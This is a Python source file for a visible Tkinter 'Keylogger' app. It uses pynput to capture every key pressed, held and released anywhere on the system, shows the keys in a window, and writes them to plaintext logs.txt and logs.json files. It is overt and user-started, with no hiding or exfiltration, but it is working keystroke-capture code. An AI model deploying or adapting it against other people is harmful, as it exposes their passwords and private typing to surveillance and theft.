import json
from pynput import keyboard
import tkinter as tk
from tkinter import scrolledtext


key_list = []
x = False
key_strokes = ""


def update_txt_file(text):
    
    with open('logs.txt', 'a', encoding='utf-8') as f:
        f.write(text)

def update_json_file(key_list):
    with open('logs.json', 'w', encoding='utf-8') as f:
        json.dump(key_list, f, indent=2)

root = tk.Tk()
root.title("Keylogger")

status_var = tk.StringVar(value="Status: Stopped")

status_label = tk.Label(root, textvariable=status_var)
status_label.pack(padx=10, pady=5)

log_text = scrolledtext.ScrolledText(root, width=60, height=15, state="disabled")
log_text.pack(padx=10, pady=5)

def append_to_gui(text: str):
    """Append text to the GUI text widget."""
    log_text.configure(state="normal")
    log_text.insert(tk.END, text + "\n")
    log_text.see(tk.END)  
    log_text.configure(state="disabled")

def on_press(key):
    global x, key_list
    try:
        k_str = key.char  
    except AttributeError:
        k_str = str(key)  

    if not x:
        key_list.append({"pressed": k_str})
        x = True
    else:
        key_list.append({"hold": k_str})

    update_json_file(key_list)
    append_to_gui(f"Pressed/Hold: {k_str}")

def on_release(key):
    global x, key_list, key_strokes
    try:
        k_str = key.char
    except AttributeError:
        k_str = str(key)

    key_list.append({"released": k_str})
    if x:
        x = False
    update_json_file(key_list)

    key_strokes = key_strokes + k_str
    update_txt_file(k_str)
    append_to_gui(f"Released: {k_str}")


listener = None

def start_keylogger():
    global listener
    if listener is None or not listener.running:
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()  
        status_var.set("Status: Running")

def stop_keylogger():
    global listener
    if listener is not None and listener.running:
        listener.stop()
        status_var.set("Status: Stopped")

btn_frame = tk.Frame(root)
btn_frame.pack(pady=5)

start_btn = tk.Button(btn_frame, text="Start", command=start_keylogger)
start_btn.grid(row=0, column=0, padx=5)

stop_btn = tk.Button(btn_frame, text="Stop", command=stop_keylogger)
stop_btn.grid(row=0, column=1, padx=5)

exit_btn = tk.Button(btn_frame, text="Exit", command=root.destroy)
exit_btn.grid(row=0, column=2, padx=5)


status_var.set("Status: Ready (click Start)")
root.mainloop()
